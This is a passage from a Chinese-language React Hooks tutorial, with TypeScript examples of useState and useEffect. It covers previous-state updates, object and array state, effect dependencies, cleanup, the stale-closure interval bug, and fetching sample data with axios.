class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">HookCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">        setCount(count + 1)</span><br><span class="language-xml">      &#125;&#125;&gt;Count &#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HookCounter</span><br></code></pre></td></tr></table></figure><blockquote><p>使用规则：</p><p>只能在顶层域调用hooks，不能在内部的循环、条件判断、嵌套的方法中使用</p><p>只能在React function中使用hooks，不能在其他普通function中使用hooks</p></blockquote><hr><p>当你的 state 值依赖上一个状态值时，就会用到 previous state。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">HookCounter</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">const</span> initialCount = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(initialCount)<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment5</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>      <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prevCount</span> =&gt;</span> prevCount + <span class="hljs-number">1</span>)<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      Count: &#123;count&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">        setCount(initialCount)</span><br><span class="language-xml">      &#125;&#125;&gt;Reset<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">        setCount(prevCount =&gt; prevCount + 1)</span><br><span class="language-xml">      &#125;&#125;&gt; + 1 <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">        setCount(prevCount =&gt; prevCount - 1)</span><br><span class="language-xml">      &#125;&#125;&gt; - 1 <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;increment5&#125;</span>&gt;</span> + 5 <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HookCounter</span><br></code></pre></td></tr></table></figure><p>使用 previousState 时，要使用 setter function 的方式，传参给 setState 方法。来确保拿到的是准确的 previous state。</p><p>在重新渲染中，useState 返回的第一个值将始终是更新后最新的 state。</p><hr><p>当useState中的state为对象时，调用相应的setState有一些要注意的地方，useState不会自动合并更新对象，可以用函数式的setState结合展开运算符来达到合并更新对象的效果。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">HookCounter</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">const</span> [name, setName] = <span class="hljs-title function_">useState</span>(&#123;<br>    <span class="hljs-attr">firstName</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">lastName</span>: <span class="hljs-string">&#x27;&#x27;</span><br>  &#125;)<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;name.firstName&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> &#123;</span><br><span class="language-xml">          setName(&#123;</span><br><span class="language-xml">            ...name,</span><br><span class="language-xml">            firstName: e.target.value</span><br><span class="language-xml">          &#125;)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;name.lastName&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> &#123;</span><br><span class="language-xml">          setName(&#123;</span><br><span class="language-xml">            ...name,</span><br><span class="language-xml">            lastName: e.target.value</span><br><span class="language-xml">          &#125;)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Your first name is &#123;name.firstName&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Your last name is &#123;name.lastName&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;JSON.stringify(name)&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HookCounter</span><br></code></pre></td></tr></table></figure><hr><p>useState with Array</p><p>点击按钮，列表增加一个1-10的随机数</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ItemType</span> &#123;<br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UseStateWithArray</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [items, setItems] = useState&lt;<span class="hljs-title class_">ItemType</span>[]&gt;([])<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">addItem</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setItems</span>([<br>      ...items,<br>      &#123;<br>        <span class="hljs-attr">id</span>: items.<span class="hljs-property">length</span>,<br>        <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">10</span>)<br>      &#125;<br>    ])<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;addItem&#125;</span>&gt;</span>add a number<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        &#123;</span><br><span class="language-xml">          items.length &gt; 0 &amp;&amp; items.map((item: ItemType) =&gt; (</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.id&#125;</span>&gt;</span>&#123;item.id&#125; : &#123;item.value&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">          ))</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">UseStateWithArray</span><br></code></pre></td></tr></table></figure><p>注意 state 中不会自动补全旧的变量，需要使用展开运算符自己手动补充</p><h5 id="2-useEffect"><a href="#2-useEffect" class="headerlink" title="2 useEffect"></a>2 useEffect</h5><blockquote><p>页面刷新时和销毁时调用</p></blockquote><p>useEffect api 的用法，第一个参数为匿名函数，作为 effect 要执行的内容。第二个参数为数组，用于观察改变的 props 或 state 进行有条件的触发 effect，或者传入空数组，让 effect 只执行一次。useEffect 返回一个匿名函数，在组件销毁是执行，可以有效避免内存泄露的风险。</p><p>可以认为是 componentDidMount, componentDidUpdate, componentWillUnmount 的替代品。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">HookCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`<span class="hljs-subst">$&#123;count&#125;</span> times`</span><br>  &#125;)<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">        setCount(prevCount =&gt; prevCount + 1)</span><br><span class="language-xml">      &#125;&#125; &gt;Clicked &#123;count&#125; times<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HookCounter</span><br></code></pre></td></tr></table></figure><p>可以看到 useEffect 的第一个入参是一个匿名函数，它会在每次 render 后调用。在第一次 render 和后续的更新 render 都会被调用。</p><p>另外，useEffect 写在函数式组件内，这样就可以直接拿到 props 和 state 的值，不用写 this 之类的代码。</p><hr><p>有条件的执行useEffect</p><p>上一节了解到 useEffect 会在每次 render 后执行里面的函数，这可能会有一些性能问题，接下来就讲一讲如何有条件地执行 useEffect 中的匿名函数。</p><p>在上一节的示例上进行扩展一个输入 name 的功能，通过判断只执行 count 变化带来的逻辑。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">HookCounter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br>  <span class="hljs-keyword">const</span> [name, setName] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;useEffect - update title&#x27;</span>)<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">`You clicked <span class="hljs-subst">$&#123;count&#125;</span> times`</span><br>  &#125;, [count])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;name&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;(e)</span> =&gt;</span> &#123;</span><br><span class="language-xml">          setName(e.target.value)</span><br><span class="language-xml">        &#125;&#125;</span><br><span class="language-xml">      /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> &#123;</span><br><span class="language-xml">        setCount(prevCount =&gt; prevCount + 1)</span><br><span class="language-xml">      &#125;&#125; &gt;Clicked &#123;count&#125; times<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HookCounter</span><br></code></pre></td></tr></table></figure><p>注意到 useEffect 的第二个参数 <code>[count]</code>，这个参数是一个数组，元素是要被观察的 state 或 props，只有指定的这个变量发生变化时，才会触发 useEffect 中的第一个参数匿名函数的执行。这有利于性能的保证。</p><hr><p>只执行一次useEffect</p><p>通过一个记录鼠标坐标的示例研究一下如何只执行一次 useEffect</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">RunEffectsOnlyOnce</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">const</span> [x, setX] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br>  <span class="hljs-keyword">const</span> [y, setY] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">logMousePos</span> = (<span class="hljs-params">e: MouseEvent</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setX</span>(e.<span class="hljs-property">clientX</span>)<br>    <span class="hljs-title function_">setY</span>(e.<span class="hljs-property">clientY</span>)<br>  &#125;<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;addEventListener&#x27;</span>)<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;mousemove&#x27;</span>, logMousePos)<br>  &#125;, [])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      Y - &#123;y&#125;, X - &#123;x&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">RunEffectsOnlyOnce</span><br></code></pre></td></tr></table></figure><p>注意到 useEffect 方法的第二个参数传入一个空数组，有效的避免了多次调用的问题。</p><p>如果想执行只运行一次的 effect（仅在组件挂载和卸载时执行），可以传递一个空数组（[]）作为第二个参数。这就告诉 React 你的 effect 不依赖于 props 或 state 中的任何值，所以它永远都不需要重复执行。这并不属于特殊情况 —— 它依然遵循依赖数组的工作方式。</p><p>如果你传入了一个空数组（[]），effect 内部的 props 和 state 就会一直拥有其初始值。尽管传入 [] 作为第二个参数更接近大家更熟悉的 <code>componentDidMount</code> 和 <code>componentWillUnmount</code> 思维模式，但我们有更好的方式来避免过于频繁的重复调用 effect。除此之外，请记得 React 会等待浏览器完成画面渲染之后才会延迟调用 <code>useEffect</code>，因此会使得额外操作很方便。</p><hr><p>需要清除的Effect<br>在 useEffect 的第一个参数中添加一个 return 匿名函数，这个匿名函数将在组件卸载的时候执行。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;addEventListener&#x27;</span>)<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;mousemove&#x27;</span>, logMousePos)<br>  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;mousemove&#x27;</span>, logMousePos)<br>  &#125;<br>&#125;, [])<br></code></pre></td></tr></table></figure><hr><p>useEffect中依赖错误导致的bug</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">IntervalCouterHooks</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>)<br><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">tick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>)<br>  &#125;<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> interval = <span class="hljs-built_in">setInterval</span>(tick, <span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-built_in">clearInterval</span>(interval)<br>    &#125;<br>  &#125;, [])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;count&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">IntervalCouterHooks</span><br></code></pre></td></tr></table></figure><p>传入空的依赖数组 <code>[]</code>，意味着该 hook 只在组件挂载时运行一次，并非重新渲染时。但如此会有问题，在 <code>setInterval</code> <code>的回调中，count</code> 的值不会发生变化。因为当 effect 执行时，我们会创建一个闭包，并将 <code>count</code> 的值被保存在该闭包当中，且初值为 0。每隔一秒，回调就会执行 <code>setCount(0 + 1)</code>，因此，<code>count</code> 永远不会超过 1。</p><p>解法一：这里我们不能将 useEffect 的第二个参数设置为空数组，而是 <code>[count]</code>。</p><p>指定 <code>[count]</code> 作为依赖列表就能修复这个 Bug，但会导致每次改变发生时定时器都被重置。事实上，每个 <code>setInterval</code> 在被清除前（类似于 setTimeout）都会调用一次。但这并不是我们想要的。要解决这个问题，我们可以使用 setState 的函数式更新形式。它允许我们指定 state 该如何改变而不用引用当前 state，即下面的解法二</p><p>解法二：将<code>setCount(count + 1)</code>改为<code>setCount((prevCount) =&gt; preCount + 1)</code></p><p>useEffect 的依赖数组里依然使用空数组。这里设置了 count 的值是和上一个值有关，也解决了问题。此时，<code>setInterval</code> 的回调依旧每秒调用一次，但每次 setCount 内部的回调取到的 <code>count</code> 是最新值（在回调中变量命名为 c）。</p><hr><p>多个useEffect</p><p>如果代码中有多个业务逻辑，可以将他们写在不同的 useEffect 中，并且可以写多个 useState 和他们匹配分组使用，会让业务逻辑更加清晰。</p><hr><p>Fetch Data with Effect Hook：使用 useEffect 来获取数据，使用 axios 库示例，<a href="https://link.juejin.cn/?target=https://jsonplaceholder.typicode.com/">jsonplaceholder.typicode.com&#x2F;</a> 网站提供了示例的请求，返回了一些 json 数据。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState, useEffect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span><br><br><span class="hljs-keyword">interface</span> postType &#123;<br>  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span><br>  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span><br>  <span class="hljs-attr">body</span>: <span class="hljs-built_in">string</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">FetchData</span>(<span class="hljs-params"></span>) &#123;<br><br>  <span class="hljs-keyword">const</span> [posts, setPosts] = useState&lt;postType[]&gt;([])<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://jsonplaceholder.typicode.com/posts&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> <span class="hljs-attr">data</span>: postType[] = res.<span class="hljs-property">data</span><br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title 